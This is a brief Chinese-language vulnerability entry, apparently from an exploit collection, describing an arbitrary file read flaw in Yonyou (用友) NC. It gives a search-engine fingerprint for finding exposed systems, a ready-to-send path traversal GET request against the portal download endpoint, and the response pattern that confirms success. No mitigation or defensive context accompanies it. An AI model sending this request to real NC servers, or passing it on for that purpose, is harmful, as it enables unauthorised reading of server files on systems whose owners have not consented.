# 用友NC存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/xml/file/download?pageId=login&filename=..\index.jsp HTTP/1.1`
- **响应特征**：200 window.location